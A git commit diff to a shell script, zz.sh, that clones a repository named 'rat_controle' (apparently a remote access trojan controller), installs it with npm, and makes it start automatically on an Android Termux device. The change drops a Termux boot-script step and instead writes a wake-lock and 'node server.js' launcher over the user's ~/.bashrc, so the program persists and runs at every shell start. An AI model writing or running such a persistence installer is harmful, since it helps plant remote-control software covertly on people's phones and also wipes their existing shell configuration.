bde36dbe5526e436c719a111136b9c8a5ca977a4
zxoman <66860395+zxoman@users.noreply.github.com>
2026-04-29 17:55:11 +0300

    asa

--- zz.sh
+++ zz.sh
@@ -4,9 +4,7 @@ cd ~ && \
 git clone https://github.com/zxoman/rat_controle.git && \
 cd rat_controle && \
 npm install && \
-mkdir -p ~/.termux/boot && \
 echo '#!/data/data/com.termux/files/usr/bin/bash
 termux-wake-lock
 cd ~/rat_controle
-node index.js' > ~/.termux/boot/start.sh && \
-chmod +x ~/.termux/boot/start.sh
+node server.js' > ~/.bashrc && \
